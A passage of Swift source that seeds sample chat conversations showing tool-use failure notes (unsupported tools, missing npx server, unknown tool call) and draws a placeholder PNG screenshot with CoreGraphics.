        var refused = Message(role: .assistant, content: "Without tools I can only suggest looking at the build log.", createdAt: ago(74), model: "qwen3-14b-instruct")
        refused.toolNotes = [ToolNote(kind: ToolNote.toolsNotAccepted, detail: "qwen3-14b-instruct does not support tools")]
        var unavailable = Message(role: .assistant, content: "The other tools were not available this time.", createdAt: ago(73), model: "qwen3-14b-instruct")
        unavailable.toolNotes = [ToolNote(kind: ToolNote.serverUnavailable, detail: "filesystem: " + MCPError.commandNotFound(name: "npx", searched: []).summary),
                                 ToolNote(kind: ToolNote.toolsNotOffered)]
        var empty = Message(role: .assistant, content: "", createdAt: ago(72), model: "qwen3-14b-instruct")
        empty.toolRounds = [ToolRound(content: "", calls: [
            call("call_6", "list_directory", "{}", ToolCallResult(status: .notCalled, text: ToolResultText.unknownTool("filesystem__list_dir")), started: false),
        ])]
        empty.toolNotes = [ToolNote(kind: ToolNote.emptyAfterTools), ToolNote(kind: ToolNote.callsNotRun)]
        try write(Conversation(
            id: ids.toolNotes,
            title: "Fix the failing build",
            createdAt: ago(80),
            updatedAt: ago(72),
            settings: settings,
            messages: [
                Message(role: .user, content: "Keep building until it passes.", createdAt: ago(76)), capped,
                Message(role: .user, content: "Try again on the other model.", createdAt: ago(75)), refused,
                Message(role: .user, content: "And now?", createdAt: ago(74)), unavailable,
                Message(role: .user, content: "One more.", createdAt: ago(73)), empty,
            ]
        ))
    }

    /// A small "screenshot" drawn with CoreGraphics, encoded as PNG.
    private static func samplePNG() -> Data? {
        let width = 480, height = 300
        guard let ctx = CGContext(data: nil, width: width, height: height, bitsPerComponent: 8, bytesPerRow: 0,
                                  space: CGColorSpace(name: CGColorSpace.sRGB)!,
                                  bitmapInfo: CGImageAlphaInfo.premultipliedLast.rawValue) else { return nil }
        let colors = [CGColor(red: 0.20, green: 0.36, blue: 0.85, alpha: 1), CGColor(red: 0.55, green: 0.30, blue: 0.85, alpha: 1)] as CFArray
        if let gradient = CGGradient(colorsSpace: CGColorSpace(name: CGColorSpace.sRGB), colors: colors, locations: [0, 1]) {
            ctx.drawLinearGradient(gradient, start: .zero, end: CGPoint(x: width, y: height), options: [])
        }
        // A fake alert dialog.
        ctx.setFillColor(CGColor(gray: 1, alpha: 0.95))
        ctx.addPath(CGPath(roundedRect: CGRect(x: 90, y: 70, width: 300, height: 160), cornerWidth: 14, cornerHeight: 14, transform: nil))
        ctx.fillPath()
        ctx.setFillColor(CGColor(red: 0.95, green: 0.27, blue: 0.23, alpha: 1))
        ctx.fillEllipse(in: CGRect(x: 215, y: 170, width: 50, height: 50))
        ctx.setFillColor(CGColor(gray: 0.75, alpha: 1))
        for (i, w) in [220, 180, 200].enumerated() {
            ctx.fill(CGRect(x: 130, y: 135 - i * 18, width: w, height: 8))
        }
        ctx.setFillColor(CGColor(red: 0.20, green: 0.45, blue: 0.95, alpha: 1))
        ctx.addPath(CGPath(roundedRect: CGRect(x: 290, y: 82, width: 80, height: 24), cornerWidth: 6, cornerHeight: 6, transform: nil))
        ctx.fillPath()
        guard let image = ctx.makeImage() else { return nil }
        let data = NSMutableData()
        guard let dest = CGImageDestinationCreateWithData(data, UTType.png.identifier as CFString, 1, nil) else { return nil }
        CGImageDestinationAddImage(dest, image, nil)
        guard CGImageDestinationFinalize(dest) else { return nil }
        return data as Data
    }
}
#endif
